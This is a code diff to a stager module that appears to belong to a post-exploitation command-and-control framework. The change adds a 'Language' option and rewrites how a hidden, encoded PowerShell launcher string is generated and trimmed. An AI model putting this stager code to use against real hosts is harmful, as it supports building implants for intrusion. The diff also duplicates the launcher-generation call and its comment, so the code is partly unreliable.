@@ -25,6 +25,11 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'Language' : {
+                'Description'   :   'Language of the stager to generate.',
+                'Required'      :   True,
+                'Value'         :   'powershell'
+            },
             'StagerRetries' : {
                 'Description'   :   'Times for the stager to retry connecting.',
                 'Required'      :   False,
@@ -66,6 +71,7 @@ class Stager:
     def generate(self):
 
         # extract all of our options
+        language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
@@ -73,8 +79,12 @@ class Stager:
         stagerRetries = self.options['StagerRetries']['Value']
         
         # generate the launcher code
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
-	launcher = launcher.replace("powershell.exe -NoP -sta -NonI -W Hidden -Enc ","")
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+
+        
+        # generate the launcher code
+        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+	launcher = launcher.replace("powershell -noP -sta -w 1 -enc  ","")
         if launcher == "":
             print helpers.color("[!] Error in launcher command generation.")
             return ""
